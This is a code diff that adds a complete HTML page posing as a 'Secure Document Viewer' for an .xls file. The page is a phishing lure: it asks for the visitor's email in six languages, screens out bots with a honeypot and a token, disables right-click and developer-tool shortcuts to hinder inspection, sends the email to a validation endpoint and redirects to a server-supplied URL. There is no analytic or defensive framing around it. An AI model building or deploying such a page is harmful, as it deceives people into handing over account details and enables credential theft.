@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no" />
+  <title>Secure Document Viewer</title>
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap" rel="stylesheet">
+
+ <style>
+    :root { --accent:#0080e2; --text:#333; --error:#c1121f; }
+    *{box-sizing:border-box;margin:0;padding:0;font-family:Inter,Arial,sans-serif}
+    html,body{height:100%}body{background:transparent;overflow:hidden}
+    .fullscreen-wrapper {
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+  justify-content: center; /* ← vertical centering */
+  min-height: 90vh;
+  padding: 2rem;
+  position: relative;
+  z-index: 1;
+}
+
+    .background-blur{position:fixed;inset:0;background:url('/access/tttssint.png')center/cover no-repeat;filter:blur(2px) brightness(1);z-index:-1}
+    .card {
+  width: 96%;
+  max-width: 340px;
+  background: #fff;
+  border-radius: 4px;
+  box-shadow: 0 1px 8px rgba(0, 0, 0, .1);
+  padding: 2rem;
+  display: flex;
+  flex-direction: column;
+  align-items: center;
+}
+
+    .card img{margin-bottom:.6rem}.card p{color:var(--text);margin:.2rem 0;font-size:1rem;text-align:center}
+    .form{width:100%;display:flex;flex-direction:column;align-items:center;gap:.8rem;margin-top:.5rem;margin-bottom:1rem}
+    .email-input{width:99%;padding:.6rem .8rem;border:1px solid #444;border-radius:2px;font-size:1rem}
+    .btn{background:var(--accent);color:#fff;padding:.6rem 1.2rem;border:1px solid #444;border-radius:2px;cursor:pointer;font-size:1rem;width:99%;display:flex;justify-content:center;align-items:center;transition:.2s}
+    .btn:hover:not(:disabled){background:#4a9eee}.btn:disabled{opacity:.55;cursor:default}
+    .error{color:var(--error);font-size:.5rem;text-align:center}
+    .footer{font-size:.1rem;color:#444;margin-top:2rem;text-align:center}
+    .footer a{text-decoration:none;color:inherit}
+    .visually-hidden{position:absolute!important;height:1px;width:1px;overflow:hidden;clip:rect(1px,1px,1px,1px)}
+  </style>
+</head>
+
+<body oncontextmenu="return false">
+<div class="fullscreen-wrapper">
+  <div class="background-blur"></div>
+
+  <div class="card">
+    <img src="/access/papalegba.png" width="90" height="30" alt="">
+    <p style="font-size:17px">TD765379_07_2025.xls</p>
+
+    <form id="verifyForm" class="form" autocomplete="off" novalidate>
+      <!-- honeypot -->
+      <input type="text" name="middleName" class="visually-hidden" tabindex="-1" autocomplete="off">
+
+      <!-- JS anti-bot token -->
+      <input type="hidden" id="jsToken" name="jsToken">
+
+      <input id="email" name="email" type="email" required class="email-input" placeholder="">
+      <p id="error" class="error" hidden></p>
+
+      <button id="submitBtn" class="btn" type="submit" disabled></button>
+    </form>
+
+    <p class="footer">© 2025 Privacy Policy</a></p>
+  </div>
+</div>
+
+
+
+
+  
+  <script>
+    // 🌐 Multilingual dictionary
+    const dict = {
+      en: { ph: "Enter your email", btn: "Next", bad: "Invalid email format", fail: "Verification failed", net: "Network error" },
+      fr: { ph: "Entrez votre e-mail", btn: "Suivant", bad: "Adresse e-mail invalide", fail: "Échec de vérification", net: "Erreur réseau" },
+      de: { ph: "E-Mail eingeben", btn: "Weiter", bad: "Ungültige E-Mail-Adresse", fail: "Überprüfung fehlgeschlagen", net: "Netzwerkfehler" },
+      nl: { ph: "Voer uw e-mail in", btn: "Volgende", bad: "Ongeldig e-mailadres", fail: "Verificatie mislukt", net: "Netwerkfout" },
+      pl: { ph: "Wprowadź e-mail", btn: "Dalej", bad: "Nieprawidłowy adres e-mail", fail: "Błąd weryfikacji", net: "Błąd sieci" },
+      it: { ph: "Inserisci e-mail", btn: "Avanti", bad: "Indirizzo e-mail non valido", fail: "Verifica fallita", net: "Errore di rete" }
+    };
+    const lang = (navigator.language || 'en').slice(0, 2).toLowerCase();
+    const t = dict[lang] || dict.en;
+
+    const emailIn = document.getElementById('email');
+    const btn     = document.getElementById('submitBtn');
+    const err     = document.getElementById('error');
+    emailIn.placeholder = t.ph;
+    btn.textContent = t.btn;
+
+    // 🕵️‍♂️ Fingerprint token & delay
+    const token = Date.now().toString(36) + Math.random().toString(36).slice(2);
+    document.getElementById('jsToken').value = token;
+    setTimeout(() => btn.disabled = false, 800);
+
+    // 🛡️ Disable DevTools keys
+    document.addEventListener('keydown', e => {
+      if (
+        (e.ctrlKey && ['u', 's', 'p'].includes(e.key.toLowerCase())) ||
+        (e.ctrlKey && e.shiftKey && ['i', 'j', 'c'].includes(e.key.toLowerCase())) ||
+        e.key === 'F12'
+      ) { e.preventDefault(); }
+    });
+
+    // 🚀 Submit logic
+    document.getElementById('verifyForm').onsubmit = async e => {
+      e.preventDefault();
+      err.hidden = true;
+
+      const email   = emailIn.value.trim();
+      const honey   = document.querySelector('input[name=middleName]').value;
+      const jsToken = document.getElementById('jsToken').value;
+
+      if (honey !== '') return;
+      if (!/^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email)) {
+        err.textContent = t.bad;
+        err.hidden = false;
+        return;
+      }
+
+      btn.disabled = true;
+      btn.textContent = 'Next…';
+
+      try {
+        const res = await fetch('/validate/api/validate-email.php', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ email, jsToken })
+        });
+
+        const data = await res.json();
+        if (data.success && data.redirectUrl) {
+          window.location.href = data.redirectUrl;
+        } else {
+          err.textContent = data.message || t.fail;
+          err.hidden = false;
+          btn.disabled = false;
+          btn.textContent = t.btn;
+        }
+      } catch (_) {
+        err.textContent = t.net;
+        err.hidden = false;
+        btn.disabled = false;
+        btn.textContent = t.btn;
+      }
+    };
+  </script>
+</body>
+</html>
